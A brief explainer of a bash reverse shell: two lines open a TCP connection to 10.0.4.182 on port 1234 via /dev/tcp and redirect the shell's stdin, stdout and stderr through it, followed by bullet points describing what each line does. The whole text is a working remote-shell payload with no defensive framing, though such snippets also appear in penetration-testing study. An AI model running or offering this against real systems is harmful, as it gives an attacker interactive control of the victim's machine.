exec 3<>/dev/tcp/10.0.4.182/1234

exec 0<&3 1>&3 2>&3


	•	exec 3<>/dev/tcp/10.0.4.182/1234
Opens a TCP connection to that IP and port and assigns it to file descriptor 3.
	•	exec 0<&3 1>&3 2>&3
Redirects stdin, stdout, and stderr to file descriptor 3, making your shell communicate entirely through the TCP connection.

